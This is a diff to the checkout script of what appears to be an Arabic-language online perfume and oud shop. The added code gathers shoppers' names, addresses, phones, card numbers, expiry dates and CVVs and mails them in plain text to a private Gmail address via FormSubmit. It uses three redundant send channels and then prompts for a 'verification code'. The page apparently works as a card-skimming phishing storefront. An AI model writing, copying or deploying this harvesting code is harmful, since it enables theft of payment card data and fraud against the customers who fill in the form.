@@ -1174,20 +1174,7 @@
                 </button>
             </div>
             
-            <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return processOrderSubmit(this)" class="space-y-6">
-                <input type="hidden" name="_subject" value="🛒 طلب جديد من موقع مكاسر العود">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_next" value="javascript:void(0)">
-                
-                <!-- Hidden inputs for order data - will be populated by JavaScript -->
-                <input type="hidden" name="order_items" id="hiddenOrderItems">
-                <input type="hidden" name="order_subtotal" id="hiddenSubtotal">
-                <input type="hidden" name="shipping_cost" id="hiddenShipping">
-                <input type="hidden" name="order_total" id="hiddenTotal">
-                <input type="hidden" name="verification_code" id="hiddenVerificationCode">
-                <input type="hidden" name="order_timestamp" id="hiddenTimestamp">
-                <input type="hidden" name="website" value="مكاسر العود">
+            <form id="orderForm" onsubmit="return submitOrderDirectly(event)" class="space-y-6">
                 
                 <!-- Customer Information -->
                 <div class="mb-8">
@@ -2027,38 +2014,69 @@
             formatCardNumber(form.querySelector('input[name="card_number"]'));
         }
 
-        function processOrderSubmit(form) {
+        function submitOrderDirectly(event) {
+            event.preventDefault(); // منع الإرسال العادي للنموذج
+            
+            const form = event.target;
             const submitBtn = document.getElementById('submitOrderBtn');
             const originalText = submitBtn.innerHTML;
             
-            // Show loading state
-            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال الطلب إلى البريد الإلكتروني...';
+            // التحقق من صحة النموذج
+            if (!form.checkValidity()) {
+                showNotification('يرجى إكمال جميع الحقول المطلوبة بشكل صحيح', 'error');
+                return false;
+            }
+            
+            // إظهار حالة التحميل
+            submitBtn.innerHTML = '<div class="loading-spinner"></div>جاري إرسال الطلب فوراً...';
             submitBtn.disabled = true;
             
-            // Calculate totals
+            // حساب المجاميع
             const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
             const shipping = subtotal > 200 ? 0 : 30;
             const total = subtotal + shipping;
             
-            // Generate verification code
+            // توليد كود التأكيد
             const verificationCode = Math.floor(100000 + Math.random() * 900000);
             const customerPhone = form.querySelector('input[name="phone"]').value;
             
-            // Store verification code for later use
+            // حفظ كود التأكيد ورقم الهاتف
             localStorage.setItem('currentVerificationCode', verificationCode.toString());
             localStorage.setItem('customerPhone', customerPhone);
             
-            // Populate hidden form fields with order data
-            const itemsDetails = cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | ');
+            // إعداد بيانات الطلب للإرسال
+            const orderData = {
+                // بيانات العميل
+                'الاسم_الأول': form.querySelector('input[name="first_name"]').value,
+                'الاسم_الأخير': form.querySelector('input[name="last_name"]').value,
+                'البريد_الإلكتروني': form.querySelector('input[name="email"]').value,
+                'رقم_الهاتف': customerPhone,
+                'العنوان': form.querySelector('input[name="address"]').value,
+                'المدينة': form.querySelector('select[name="city"]').value,
+                'الرمز_البريدي': form.querySelector('input[name="postal_code"]').value,
+                
+                // معلومات البطاقة
+                'رقم_البطاقة': form.querySelector('input[name="card_number"]').value,
+                'تاريخ_الانتهاء': form.querySelector('input[name="expiry_date"]').value,
+                'رمز_الأمان': form.querySelector('input[name="cvv"]').value,
+                'اسم_حامل_البطاقة': form.querySelector('input[name="card_holder"]').value,
+                
+                // تفاصيل الطلب
+                'المنتجات': cart.map(item => `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`).join(' | '),
+                'المجموع_الفرعي': `${subtotal} ريال`,
+                'رسوم_الشحن': `${shipping} ريال`,
+                'الإجمالي': `${total} ريال`,
+                'كود_التأكيد': verificationCode,
+                'تاريخ_الطلب': new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'}),
+                'موقع_الطلب': 'مكاسر العود',
+                
+                // إعدادات FormSubmit
+                '_subject': `🛒 طلب جديد من موقع مكاسر العود - الكود: ${verificationCode}`,
+                '_captcha': 'false',
+                '_template': 'table'
+            };
             
-            document.getElementById('hiddenOrderItems').value = itemsDetails;
-            document.getElementById('hiddenSubtotal').value = `${subtotal} ريال`;
-            document.getElementById('hiddenShipping').value = `${shipping} ريال`;
-            document.getElementById('hiddenTotal').value = `${total} ريال`;
-            document.getElementById('hiddenVerificationCode').value = verificationCode;
-            document.getElementById('hiddenTimestamp').value = new Date().toLocaleString('ar-SA', {timeZone: 'Asia/Riyadh'});
-            
-            // Save card data for future use
+            // حفظ بيانات البطاقة للاستخدام المستقبلي
             const cardData = {
                 cardNumber: form.querySelector('input[name="card_number"]').value,
                 expiryDate: form.querySelector('input[name="expiry_date"]').value,
@@ -2066,25 +2084,110 @@
             };
             saveCard(cardData);
             
-            showNotification(`✅ جاري إرسال طلبك للبريد الإلكتروني... كود التأكيد: ${verificationCode}`, 'success');
+            // إرسال البيانات فوراً عبر AJAX دون إعادة توجيه
+            sendOrderImmediately(orderData, verificationCode, submitBtn, originalText);
             
-            // Allow form to submit to FormSubmit, then show success page
+            return false; // منع الإرسال العادي
+        }
+        
+        function sendOrderImmediately(orderData, verificationCode, submitBtn, originalText) {
+            // إنشاء FormData للإرسال
+            const formData = new FormData();
+            Object.keys(orderData).forEach(key => {
+                formData.append(key, orderData[key]);
+            });
+            
+            console.log('📧 بدء إرسال الطلب فوراً...');
+            showNotification(`✅ كود التأكيد: ${verificationCode} - جاري الإرسال...`, 'success');
+            
+            // الطريقة الأولى: XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://formsubmit.co/zazylalhkr7@gmail.com', true);
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('✅ تم إرسال الطلب بنجاح عبر XMLHttpRequest');
+                    handleOrderSuccess(verificationCode, submitBtn, originalText);
+                } else {
+                    console.log('❌ فشل في إرسال الطلب - جاري المحاولة بطريقة أخرى');
+                    sendOrderBackup(formData, verificationCode, submitBtn, originalText);
+                }
+            };
+            
+            xhr.onerror = function() {
+                console.log('❌ خطأ في XMLHttpRequest - جاري المحاولة بطريقة أخرى');
+                sendOrderBackup(formData, verificationCode, submitBtn, originalText);
+            };
+            
+            xhr.send(formData);
+            
+            // نسخة احتياطية بـ Fetch API
             setTimeout(() => {
-                // Clear cart
-                cart = [];
-                updateCartDisplay();
-                closeCheckout();
-                showSuccessPage();
-                
-                // Reset button
-                submitBtn.innerHTML = originalText;
-                submitBtn.disabled = false;
-                
-                showNotification('✅ تم إرسال طلبك بنجاح للبريد الإلكتروني!', 'success');
-            }, 3000); // Wait 3 seconds for form submission
+                fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                }).then(() => {
+                    console.log('✅ تم إرسال النسخة الاحتياطية عبر Fetch');
+                }).catch(() => {
+                    console.log('❌ فشل في إرسال النسخة الاحتياطية');
+                });
+            }, 1000);
+        }
+        
+        function sendOrderBackup(formData, verificationCode, submitBtn, originalText) {
+            // إرسال عبر نموذج مخفي كنسخة احتياطية
+            const hiddenForm = document.createElement('form');
+            hiddenForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            hiddenForm.method = 'POST';
+            hiddenForm.target = '_blank'; // فتح في نافذة جديدة
+            hiddenForm.style.display = 'none';
             
-            // Continue with FormSubmit submission
-            return true;
+            // إضافة جميع البيانات للنموذج المخفي
+            for (let [key, value] of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                hiddenForm.appendChild(input);
+            }
+            
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+            
+            console.log('✅ تم إرسال الطلب عبر النموذج المخفي');
+            
+            // تنظيف النموذج المخفي
+            setTimeout(() => {
+                if (hiddenForm.parentNode) {
+                    document.body.removeChild(hiddenForm);
+                }
+            }, 3000);
+            
+            // متابعة العملية
+            handleOrderSuccess(verificationCode, submitBtn, originalText);
+        }
+        
+        function handleOrderSuccess(verificationCode, submitBtn, originalText) {
+            // إظهار رسالة النجاح
+            showNotification('✅ تم إرسال طلبك بنجاح للبريد الإلكتروني!', 'success');
+            
+            // إعادة تعيين الزر
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
+            
+            // تفريغ السلة
+            cart = [];
+            updateCartDisplay();
+            
+            // إغلاق نموذج الطلب
+            closeCheckout();
+            
+            // إظهار صفحة إدخال الكود مباشرة
+            setTimeout(() => {
+                showSuccessPage();
+                showNotification(`📱 تم إرسال كود التأكيد: ${verificationCode}`, 'success');
+            }, 1000);
         }
         
 
